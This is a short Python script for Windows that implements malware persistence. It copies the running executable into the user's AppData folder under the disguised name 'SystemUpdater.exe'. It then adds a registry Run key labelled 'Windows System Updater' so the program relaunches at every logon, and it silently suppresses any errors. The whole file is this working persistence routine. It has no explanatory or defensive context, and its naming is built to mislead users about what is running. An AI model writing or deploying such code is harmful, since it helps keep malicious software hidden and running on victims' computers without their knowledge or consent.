import os
import sys
import shutil
import winreg

def install_persistence():
    app_name = "SystemUpdater.exe"
    
    install_path = os.path.join(os.getenv('APPDATA'), app_name)

    if sys.executable == install_path:
        return

    try:
        shutil.copy(sys.executable, install_path)

        key = winreg.HKEY_CURRENT_USER
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        
        registry_key = winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE)
        
        winreg.SetValueEx(registry_key, "Windows System Updater", 0, winreg.REG_SZ, install_path)
        
        winreg.CloseKey(registry_key)
        
    except Exception as e:
        pass


if __name__ == '__main__':
    install_persistence()
